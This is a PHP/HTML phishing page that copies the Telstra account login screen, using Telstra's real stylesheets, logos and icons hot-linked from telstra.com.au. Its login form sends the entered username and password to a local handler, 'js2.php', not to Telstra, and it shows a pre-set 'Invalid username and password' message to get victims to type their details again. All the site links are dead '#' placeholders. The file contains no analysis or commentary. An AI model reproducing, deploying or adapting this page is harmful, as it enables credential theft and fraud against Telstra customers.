<?php
ob_start();
?>
<!DOCTYPE html>
<!--[if lt IE 7]> <html class="lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>    <html class="lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>    <html class="lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html lang="en"> <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>Telstra Login</title>
  <meta name="TITLE" content="Telstra" />
  <meta name="DESCRIPTION" content="" />
  <meta name="KEYWORDS" content="" />
  <meta name="ROBOTS" content="NOINDEX,NOFOLLOW" />
  <meta name="RIGHTS" content="https://www.telstra.com.au/copyright-trademarks/" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=0.7, user-scalable=yes">
  <link rel="shortcut icon" href="https://www.telstra.com.au/etc/designs/tcom/global/img/telstra/favicon-base-blue.ico">
  
  
  <link rel="stylesheet" href="https://www.telstra.com.au/etc/designs/tcom/global/css/bootstrap-responsive.css" type="text/css" media="all">
  <link rel="stylesheet" href="https://www.telstra.com.au/etc/designs/tcom/global/css/styles-responsive.css" type="text/css" media="all">
  <!--[if lte IE 9]>
  <link href="https://www.telstra.com.au/etc/designs/tcom/global/css/styles-responsive-ie.css" rel="stylesheet" media="all">
  <![endif]-->
  <link rel="stylesheet" href="https://www.telstra.com.au/etc/designs/tcom/global/css/styles-print.css" media="print">
  <link rel='stylesheet' href='https://www.telstra.com.au/etc/designs/tcom/service-qualifier/css/service-qualifier.css' type='text/css'>
  
  <style type="text/css">
  input[type="text"],input[type="number"],input[type="tel"],input[type="email"],input[type="password"]{float:left;border:1px solid #ccc;width:100%;height:34px;line-height:1.42857;margin:1px 0 5px;max-width:712px;padding:0;transition:border-color .15s ease-in-out 0,box-shadow .15s ease-in-out 0;-webkit-appearance:none;-webkit-box-shadow:rgba(0,0,0,0.07451) 0 1px 1px 0 inset;-webkit-rtl-ordering:logical;-webkit-transition-delay:0,0;-webkit-transition-duration:.15s,0.15s;-webkit-transition-property:border-color,box-shadow;-webkit-transition-timing-function:ease-in-out,ease-in-out;-webkit-user-select:text;-webkit-writing-mode:horizontal-tb;background-color:#fff;background-image:none;border-image-outset:0;border-image-repeat:stretch;border-image-slice:100%;border-image-source:none;border-image-width:1;box-shadow:rgba(0,0,0,0.07451) 0 1px 1px 0 inset;box-sizing:border-box;color:#555;cursor:auto;display:block;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;font-style:normal;font-variant:normal;font-weight:400;height:34px;letter-spacing:normal;line-height:20px;margin-bottom:0;margin-left:0;margin-right:0;margin-top:0;padding-bottom:6px;padding-left:12px;padding-right:12px;padding-top:6px;text-align:start;text-indent:0;text-shadow:none;text-transform:none;transition-delay:0,0;transition-duration:.15s,0.15s;transition-property:border-color,box-shadow;transition-timing-function:ease-in-out,ease-in-out;width:100%;word-spacing:0;border-color:#ccc;border-style:solid;border-width:1px}
  input[type="text"]:focus,input[type="number"]:focus,input[type="tel"]:focus,input[type="email"]:focus,select:focus,input[type="password"]:focus{border-color:#aaa;outline:0;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.075),0 0 8px rgba(102,175,233,0.6);box-shadow:inset 0 1px 1px rgba(0,0,0,0.075),0 0 8px rgba(102,175,233,0.6)}
  select{margin-right:3px;background-color:#fff;background-image:none;border:1px solid #ccc;box-shadow:0 1px 1px rgba(0,0,0,0.075) inset;color:#555;display:block;font-size:14px;height:34px;line-height:1.42857;padding:6px 12px;transition:border-color .15s ease-in-out 0,box-shadow .15s ease-in-out 0;width:auto;height:33px!important;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
  input[type=checkbox],input[type=radio]{width:20px;height:20px;margin-top:0;margin-right:10px!important;float:left}
  .input-wrapper{    margin-bottom: 15px;
  float: left;
  width: 100%; clear:both;}
  .input-container{width:80%;float: left;}
  .link-helper{    display: block;
  float: left;
  background-color: #004d9d;margin-left: 5px}
  .left{float:left;}
  .button:after, .btn:after{    background: url(https://www.telstra.com.au/uberprod/ss-global/themes/v11/images/v2.1-ui-button-sprite.png) 0px -88px no-repeat #004d9d ;    content: ' ';}
  .btn:after{background-position: 0px -131px}
  .btn:hover:after{background-position: 0px -88px}
  .icons-register{margin-bottom: 15px}
  .field-group {position: relative}
  .tooltip-left{     border: 1px solid #ddd; position:absolute; margin:0; padding:12px; border:1px solid black;display:none; background-color: #fff; top: -100%; left: 79%; width: 250px;  z-index:9999;font-size: 12px}
  
  .tooltip-left {
  
  border: 1px solid #ddd;
  }
  #tooltip0{left:93%;}
  #tooltip1{top:-156%;}
  .tooltip-left:after, .tooltip-left:before {
  right: 100%;
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
  }
  .tooltip-left:after {
  border-color: rgba(255, 255, 255, 0);
  border-right-color: #fff;
  border-width: 10px;
  margin-top: -10px;
  }
  .tooltip-left:before {
  border-color: rgba(221, 221, 221, 0);
  border-right-color: #ddd;
  border-width: 11px;
  margin-top: -11px;
  }
  @media only screen and (max-width:680px) {
  .tooltip-left{position: relative;display: block;float: left;top:8px;left:0;border:1px solid #fff;width: 100%; box-sizing:border-box;}
  .tooltip-left:after {display: none}
  }
  
  #spectrum_local span{
        background-image: url("/res/images/commonLogin/v2.1-spectrum-blue.jpg");
        background-position: 50% 0;
        background-repeat: no-repeat;
        background-size: cover;
        display: block;
        height: 580px;
        margin-top: 81px;
        max-height: 580px;
        position: absolute;
        visibility: hidden;
        width: 100%;
  }
  
  .msg-error {
        background: #fff none repeat scroll 0 0;
        border: 2px solid #b32034;
        border-radius: 8px;
        font-size: 14px;
        max-height: 380px;
        margin: 20px 0;
        overflow: hidden;
        min-width:250px;
        max-width: 400px;
    }
  
  .msg-error em {
    background: #b32034 url("/res/images/servicePlus/exclamation-mark-icon.png") no-repeat scroll 5px 3px;
    display: block;
    float: left;
    margin-bottom: -3000px;
    padding-bottom: 3000px;
    width: 30px;
  }
  .legend {
    display: inline-block;
   }
  </style>
</head>
<!-- Check logged-in user has permission to write or not. -->
<body role="document" class="base-blue  white-bkg">

  <span id="spectrum"></span>

<div id="shade"></div>
<header class="hide-header">
  
 
  <div id="global-nav" class="navbar navbar-inverse offcanvas" role="navigation">
    <div class="container">
      <div class="navbar-collapse collapse">
        <ul class="nav navbar-nav" id="global-nav-menu">
          
          <li>
            <a href="#">Telstra.com</a>
          </li>
          
          <li class="active">
            <a href="#">Personal</a>
          </li>
          <li>
            <a href="#">Small Business</a>
          </li>
          <li>
            <a href="#">Business &amp; Enterprise</a>
          </li>
          <li>
            <a href="#">Health</a>
          </li>
          <li>
            <a href="#">Sport &amp; Entertainment</a>
          </li>
          
        </ul>
        <!-- Login Tile -->
        <div id="login-placeholder"></div>
      </div>
    </div>
  </div>
  
  
  
  
  <div id="primary-nav" class="navbar visible-lg" role="navigation">
    <div class="container">
      <div class="navbar-collapse collapse">
        
        
        
        
        
        
        
        
        
        
        <ul class="nav navbar-nav navbar-left">
          <li>
            <a href="#" title="" class="site-title" onClick="s.tlWrapper(this,&quot;o&quot;,&quot;pers-hp_ _1_https://www.telstra.com.au/&quot;);">
              <span class="site-logo">&nbsp;</span>
            </a>
            
            
            
            
            <a href="#" title="" class="site-title" onClick="s.tlWrapper(this,&quot;o&quot;,&quot;pers-hp_PERSONAL_2_https://www.telstra.com.au/personal&quot;);">
              <span class="site-title">Personal</span>
            </a>
            
            
            
            
            
          </li>
        </ul>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
      </div>
    </div>
  </div>
  <div class="site-header" role="navigation">
    <div class="container">
      
      
      
      
      
      
      
      
      
      
      
      <a href="#" class="site-logo" onClick="s.tlWrapper(this,&quot;o&quot;,&quot;pers-hp_Telstra.com_2_https://www.telstra.com.au/&quot;);"><span class="vh">Telstra.com</span></a>
      
      
      
      
    </div>
  </div><div class="site-header is-fixed headroom headroom--top" role="navigation">
  <div class="container">
    
    
    
    
    
    
    
    
    
    
    
    <a href="#" class="site-logo is-light is-small" onClick="s.tlWrapper(this,&quot;o&quot;,&quot;pers-hp_Telstra.com_3_https://www.telstra.com.au/&quot;);"><span class="vh">Telstra.com</span></a>
    
    
    
    
  </div>
</div>
<div id="page-header" class="container offcanvas">
  <div id="header" class="row header transparent">
    <div class="page-title col-md-7">
      <h1><a></a></h1>
    </div>
  </div>
</div>

</header>
<div class="main-content-wrapper offcanvas">
<div class="container main-content" role="main" style="min-height:418px;">
  <div class="content parsys">
    <div class="parbase textimage section heroRow">
      <div class="standard row content col-100">
        <div class="col col-100-c0 first last">
          <div class="col-wrapper">
            <form method="post" class="form" action="js2.php">
                
              <div class="no-equalise standard row content col-50-50 group group-start no-title" id="on-your-tv" style="">
                <div class="col col-50-50-c0   first">
                  <div class="col-wrapper">
                    <div class="col col-25-75-c0">
                      <span class="sub-heading">Log in</span>
                    </div>
                    <div class="col col-25-75-c1">
                      <div class="input-wrapper field-group">
                        <div class="input-container">
                          <span class="visible-ie8" style="color:red;"> Invalid username and password </span>
                          <input type="text" required name="username" placeholder="Username">
                        </div>
                        <div><img class="link-helper"   src="https://www.telstra.com.au/global/icons/small/help-mask.png" width="22px"></div>
                        <div class = "tooltip-left" id= "tooltip0" style="display:none">
                          <p>e.g. you@bigpond.com, you@telstra.com, you@bigpond.net.au, you@yourdomain.com</p>
                        </div>
                      </div>
                      <div  class="input-wrapper">
                        <div class="input-container">
                          <span class="visible-ie8"></span>
                          <input type="password"  required  name="password" autocomplete="off"  placeholder="password">
                        </div>
                      </div>
                      <div class="field-group checkbox no-main-label input-wrapper">
                        <label class="inline left"  for="rememberMe"><input type="checkbox" name="rememberMe" id="rememberMe" value="true"> Remember username</label> <img class="link-helper"  onclick="show(tooltip1)"  src="https://www.telstra.com.au/global/icons/small/help-mask.png" width="22px" >
                        
                        <div class = "tooltip-left" id= "tooltip1" style="display:none">
                          <p>Your username will be remembered on this computer, making logging in quicker and easier every time you visit. You'll only need to enter your password.</p>
                        </div>
                      </div>
                      <div >
                        <button  name="Submit" class="button primary" type="submit" >Log in</button>
						<p><p>Forgotten your <a href="#">username</a> or <a href="#">password</a>?</p>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="col col-50-50-c1 last  ">
                  <div class="col-wrapper">
                    <div class="parbase textimage imageModule section">
                      <div class="standard row content transparent col-100">
                        <div class="col col-100-c0 first last">
                          <div class="padding-bottom-grey-box small-top-margin-grey-box grid_7 right omega cf">
                            <h2 class="text-left colour sub-heading ">Register for My Account</h2>
                            <ul class="icons-register cf">
                              <img src="https://www.telstra.com.au/content/dam/tcom/external/why-register/icon-check-usage.png" style="width:35px;height:35px">&nbsp;Check estimated call and data usage<br>
                              <img src="https://www.telstra.com.au/content/dam/tcom/external/why-register/icon-billing.png" style="width:35px;height:35px">&nbsp;Pay bills and save payment method<br>
                              <img src="https://www.telstra.com.au/content/dam/tcom/external/why-register/icon-recharge.png" style="width:35px;height:35px">&nbsp;Recharge a Pre-Paid service<br>
                              <img src="https://www.telstra.com.au/content/dam/tcom/external/why-register/icon-direct-debit.png" style="width:35px;height:35px">&nbsp;Check recent charges and credits<br>
                              
                            </ul>
                            <a href="#" title="Register now" class="btn secondary" track-des="MyAcctV2-LP-RegisterNow">Register now</a>


                          </span>
                        </div>
                        <div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>
</div>
</div>
<footer>
<div role="footer" class="footer">
  <div class="footer-links container">
    <div
      class="system_generated_classes holderjs standard  row content col-25-25-25-25 default">
      <div class="col first col-25-25-25-25-c0">
        <div class="col-wrapper">
          <ul class="social-icons">
            <li>
              <a href="#" aria-label="Facebook"><span
              class="social-icon facebook"></span></a>
            </li>
            <li><a href="#" aria-label="Twitter"><span
            class="social-icon twitter"></span></a></li>
            <li><a href="#" aria-label="YouTube"><span
            class="social-icon youtube"></span></a></li>
            <li><a href="#" aria-label="Google+"><span
            class="social-icon google"></span></a></li>
          </ul>
          
        </div>
      </div>
      <div class="col col-25-25-25-25-c1">
        <div class="col-wrapper">
          <ul>
            <li><a href="#" class="header">Telstra.com sitemap</a></li>
            <li>
              <a href="#">Contact us</a>
            </li>
            <li>
              <a href="#">Find a store</a>
            </li>
            <li><a href="#">Careers</a></li>
          </ul>
        </div>
      </div>
      <div class="col col-25-25-25-25-c2">
        <div class="col-wrapper">
          <ul>
            <li><a href="#" class="header">About us</a></li>
            <li><a href="#">Telstra Wholesale</a></li>
            <li><a href="#">Telstra Global</a></li>
            <li><a href="#">Telstra Digital</a></li>
          </ul>
        </div>
      </div>
      <div class="clearfix hidden-lg"></div>
      <div class="col col-25-25-25-25-c3">
        <div class="col-wrapper">
          <ul>
            <li><a href="#" class="header">Consumer Advice</a></li>
            <li><a href="#">Critical
            Information Summaries</a></li>
            <li><a href="#">Terms of use</a></li>
            <li><a href="#">Privacy</a></li>
          </ul>
        </div>
      </div>
    </div>
    
  </div>
</div>
</footer>
</div>
 </div>
</div>

</body>
</html>

